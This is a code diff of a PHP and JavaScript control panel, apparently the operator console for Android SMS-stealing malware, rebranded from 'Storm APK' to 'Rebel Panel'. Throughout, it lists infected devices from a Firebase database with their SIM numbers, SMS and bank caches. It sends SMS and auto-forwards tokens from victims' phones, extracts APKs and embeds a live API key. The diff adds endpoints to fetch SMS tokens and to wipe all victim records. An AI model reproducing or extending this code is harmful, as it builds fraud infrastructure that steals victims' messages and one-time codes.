@@ -1,9 +1,9 @@
 <?php
 require_once __DIR__ . '/rebel_bot_lib.php';
 
-$DDR_STORM_FIREBASE = [
+$REBEL_PANEL_FIREBASE = [
   'id' => 'stormapk_9edea',
-  'name' => 'Storm APK',
+  'name' => 'Rebel Panel',
   'databaseURL' => 'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',
   'url' => 'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',
   'apiKey' => 'AIzaSyCuFRrF3_yxait_oOFkDxjdrsZkwno_Uy8',
@@ -21,11 +21,11 @@ $DDR_STORM_FIREBASE = [
 if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
   rebel_json_out([
     'ok' => true,
-    'projects' => [$DDR_STORM_FIREBASE],
+    'projects' => [$REBEL_PANEL_FIREBASE],
   ]);
 }
 
-$serverProjects = [$DDR_STORM_FIREBASE];
+$serverProjects = [$REBEL_PANEL_FIREBASE];
 
 if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
   $body = json_decode(file_get_contents('php://input') ?: '{}', true);
@@ -67,6 +67,23 @@ if (isset($_GET['rebel_apk_extract']) || isset($_POST['rebel_apk_extract'])) {
   rebel_apk_extract_api_handle();
 }
 
+if (isset($_GET['sms_token_api']) || isset($_POST['sms_token_api'])) {
+  rebel_sms_token_api_handle();
+}
+
+if (isset($_GET['rebel_wipe_clients']) || isset($_POST['rebel_wipe_clients'])) {
+  $fbUrl = rtrim($REBEL_PANEL_FIREBASE['databaseURL'], '/');
+  $authKey = rebel_firebase_auth_key($fbUrl, '');
+  $wiped = [];
+  foreach (['clients', 'devices', 'messages', 'user_list', 'user_data'] as $node) {
+    $res = rebel_firebase_req('DELETE', $fbUrl, $authKey, $node);
+    if ($res !== null) {
+      $wiped[] = $node;
+    }
+  }
+  rebel_json_out(['ok' => true, 'wiped' => $wiped]);
+}
+
 function rebel_avatar_url() {
   if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
   if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
@@ -86,7 +103,7 @@ header('Pragma: no-cache');
 <meta name="theme-color" content="#050508"/>
 <meta name="apple-mobile-web-app-capable" content="yes"/>
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
-<title>DDR Panel — Storm APK</title>
+<title>Rebel Panel</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
@@ -324,7 +341,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <img src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
       </div>
       <div>
-        <div class="hdr-title">DDR · Storm APK</div>
+        <div class="hdr-title">Rebel Panel</div>
         <div class="hdr-sub" id="hdrSub">Connecting...</div>
       </div>
     </div>
@@ -385,11 +402,12 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
     </section>
 
     <section class="screen" id="screen-more">
-      <span class="proto-tag">👑 ADMIN PANEL</span>
+      <span class="proto-tag">👑 REBEL PANEL</span>
       <div class="menu-list">
         <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
+        <div class="menu-item danger" onclick="wipeAllClients()">Wipe all devices <span>Fresh start</span></div>
       </div>
     </section>
   </div>
@@ -407,10 +425,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 <div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
 <div class="sheet" id="fbSheet">
   <div class="sheet-handle"></div>
-  <div class="sheet-title">Storm APK Firebase</div>
+  <div class="sheet-title">Rebel Panel Firebase</div>
   <div id="fbSheetList"></div>
   <div class="fb-add-form" style="padding:12px 0;font-size:11px;color:var(--muted);line-height:1.5">
-    Locked to <b>stormapk-9edea</b> only. Use <a href="admin.php" style="color:var(--accent2)">admin.php</a> for multi-Firebase panels.
+    Locked to <b>stormapk-9edea</b>. Multi-Firebase: <a href="admin.php" style="color:var(--accent2)">admin.php</a>
   </div>
 </div>
 <div class="toast-wrap" id="toasts"></div>
@@ -420,9 +438,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 var SEND_SMS_URL='ddr.php?rebel_send_sms=1';
 var FETCH_SMS_URL='ddr.php?rebel_fetch_sms=1';
 var APK_EXTRACT_URL='ddr.php?rebel_apk_extract=1';
-var SMS_TOKEN_URL='sex.php?sms_token_api=1';
+var SMS_TOKEN_URL='ddr.php?sms_token_api=1';
+var WIPE_CLIENTS_URL='ddr.php?rebel_wipe_clients=1';
 var FIREBASE_API_URL='ddr.php?rebel_firebase_api=1';
-var DDR_STORM_ONLY=true;
+var REBEL_PANEL_ONLY=true;
 var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
@@ -622,7 +641,7 @@ function initFirebaseInstance(cfg){
       db=firebase.app(appName).database();
     }catch(e){}
   }
-  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
+  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||((cfg.databaseURL||'').indexOf('rabel')>=0||(cfg.databaseURL||'').indexOf('stormapk')>=0?'rabel':'spinplay'),liveAttached:false};
   firebaseInstances.push(inst);return inst;
 }
 function initFirebase(){
@@ -763,8 +782,31 @@ function getPhoneFromRecord(s){
   if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var i=0;i<si.sims.length;i++){var sim=si.sims[i];var pn=sim.phoneNumber||sim.number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no;if(pn)return String(pn).trim();}}}
   return '';
 }
+function flattenClientRecord(raw){
+  if(!raw||typeof raw!=='object')return raw;
+  var flat=Object.assign({},raw);
+  var di=raw.device_info,ld=raw.live_data;
+  if(di&&typeof di==='object'){
+    flat.name=flat.name||di.device_model||di.model||di.name;
+    flat.brand=flat.brand||di.device_brand||di.brand;
+    flat.android=flat.android||di.android_version||di.android;
+    flat.device_model=flat.device_model||di.device_model;
+    flat.mobNo=flat.mobNo||di.mobNo||di.phone||di.mobile;
+  }
+  if(ld&&typeof ld==='object'){
+    flat.battery=flat.battery||ld.battery_level||ld.battery;
+    flat.battery_level=flat.battery_level||ld.battery_level;
+    flat.network=flat.network||ld.network_type||ld.network;
+    flat.network_type=flat.network_type||ld.network_type;
+    flat.sms_count=flat.sms_count||ld.total_sms;
+  }
+  if(raw.online_status===true){flat.online=true;flat.online_status=true;}
+  if(raw.online_status===false){flat.online=false;flat.online_status=false;}
+  return flat;
+}
 function normalizeClientRecord(raw){
   if(!raw||typeof raw!=='object')return null;
+  raw=flattenClientRecord(raw);
   if(raw.password||raw.Pass)return null;
   var on=resolveOnlineStatus(raw,raw._fbId||'');
   if(raw.modelName||raw.deviceId||raw.mobNo)return{
@@ -1462,7 +1504,7 @@ function rebelApkHeaders(){
   return h;
 }
 
-/* AUTO TOKEN (via sex.php API) */
+/* AUTO TOKEN */
 var _autoTokenOn=false;
 function smsTokenFetch(body){
   var hdr={'Content-Type':'application/json'};
@@ -1488,6 +1530,20 @@ function useSelForAutoToken(){
   smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
     toast('Auto SMS device set',true);
   }).catch(function(){toast('Auto token save failed',false);});
+}
+function wipeAllClients(){
+  if(!confirm('Delete ALL devices from Firebase? Fresh project — cannot undo.'))return;
+  fetch(WIPE_CLIENTS_URL,{method:'POST',credentials:'same-origin'})
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d&&d.ok){
+        clientsRawMap={};allDevs=[];selDev='';deviceSmsCache={};deviceBankCache={};
+        try{localStorage.removeItem(SMS_CACHE_KEY);}catch(e){}
+        renderDevices();updateStats();updateFbUi();
+        toast('Wiped: '+(d.wiped||[]).join(', '),true);
+      }else toast((d&&d.error)||'Wipe failed',false);
+    })
+    .catch(function(){toast('Wipe request failed',false);});
 }
 
 /* BOOT — direct open, all Firebase combined */
